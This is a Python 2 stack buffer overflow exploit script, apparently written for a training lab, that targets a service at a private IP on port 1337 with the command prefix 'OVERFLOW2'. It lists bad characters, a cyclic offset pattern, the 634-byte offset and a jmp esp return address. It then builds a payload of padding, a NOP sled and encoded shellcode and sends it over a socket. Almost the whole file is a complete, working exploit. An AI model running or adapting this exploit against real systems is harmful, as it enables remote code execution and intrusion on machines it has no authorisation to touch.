#!/usr/bin/python2

import socket 
import sys

host = "192.168.1.4"
port = 1337
size = 700 
payload = ""

try :
	# badchas \x00\x23\x3C\x83\xba
	print "[+]Trying .. \n"
	prefix  = "OVERFLOW2 "
	offset  = 634
	# jmp esp 625011C7  \xc7\x11\x50\x62
	# msf_pattern_create ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"
	#"[+] Possible match at offset 634 (adjusted [ little-endian: 3 | big-endian: 1044483 ] ) byte offset 0"

	buf =  b""
	buf += b"\xfc\xbb\x93\xc1\xab\x80\xeb\x0c\x5e\x56\x31\x1e\xad"
	buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x6f"
	buf += b"\x29\x29\x80\x8f\xaa\x4e\x08\x6a\x9b\x4e\x6e\xff\x8c"
	buf += b"\x7e\xe4\xad\x20\xf4\xa8\x45\xb2\x78\x65\x6a\x73\x36"
	buf += b"\x53\x45\x84\x6b\xa7\xc4\x06\x76\xf4\x26\x36\xb9\x09"
	buf += b"\x27\x7f\xa4\xe0\x75\x28\xa2\x57\x69\x5d\xfe\x6b\x02"
	buf += b"\x2d\xee\xeb\xf7\xe6\x11\xdd\xa6\x7d\x48\xfd\x49\x51"
	buf += b"\xe0\xb4\x51\xb6\xcd\x0f\xea\x0c\xb9\x91\x3a\x5d\x42"
	buf += b"\x3d\x03\x51\xb1\x3f\x44\x56\x2a\x4a\xbc\xa4\xd7\x4d"
	buf += b"\x7b\xd6\x03\xdb\x9f\x70\xc7\x7b\x7b\x80\x04\x1d\x08"
	buf += b"\x8e\xe1\x69\x56\x93\xf4\xbe\xed\xaf\x7d\x41\x21\x26"
	buf += b"\xc5\x66\xe5\x62\x9d\x07\xbc\xce\x70\x37\xde\xb0\x2d"
	buf += b"\x9d\x95\x5d\x39\xac\xf4\x09\x8e\x9d\x06\xca\x98\x96"
	buf += b"\x75\xf8\x07\x0d\x11\xb0\xc0\x8b\xe6\xb7\xfa\x6c\x78"
	buf += b"\x46\x05\x8d\x51\x8d\x51\xdd\xc9\x24\xda\xb6\x09\xc8"
	buf += b"\x0f\x18\x59\x66\xe0\xd9\x09\xc6\x50\xb2\x43\xc9\x8f"
	buf += b"\xa2\x6c\x03\xb8\x49\x97\xc4\x07\x25\x96\x1d\xe0\x34"
	buf += b"\x98\x19\x22\xb1\x7e\x4b\xd2\x94\x29\xe4\x4b\xbd\xa1"
	buf += b"\x95\x94\x6b\xcc\x96\x1f\x98\x31\x58\xe8\xd5\x21\x0d"
	buf += b"\x18\xa0\x1b\x98\x27\x1e\x33\x46\xb5\xc5\xc3\x01\xa6"
	buf += b"\x51\x94\x46\x18\xa8\x70\x7b\x03\x02\x66\x86\xd5\x6d"
	buf += b"\x22\x5d\x26\x73\xab\x10\x12\x57\xbb\xec\x9b\xd3\xef"
	buf += b"\xa0\xcd\x8d\x59\x07\xa4\x7f\x33\xd1\x1b\xd6\xd3\xa4"
	buf += b"\x57\xe9\xa5\xa8\xbd\x9f\x49\x18\x68\xe6\x76\x95\xfc"
	buf += b"\xee\x0f\xcb\x9c\x11\xda\x4f\xac\x5b\x46\xf9\x25\x02"
	buf += b"\x13\xbb\x2b\xb5\xce\xf8\x55\x36\xfa\x80\xa1\x26\x8f"
	buf += b"\x85\xee\xe0\x7c\xf4\x7f\x85\x82\xab\x80\x8c\x82\x4b"
	buf += b"\x7f\x2f"

	payload += prefix
	payload += "A"*offset
	payload += "\xc7\x11\x50\x62" # jmp esp 
	payload += "\x90"*20
	payload += buf

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(payload)
	print "[+] payload has been successfully \n"
	s.close()

except :
	print "[+] Host is down "
	sys.exit()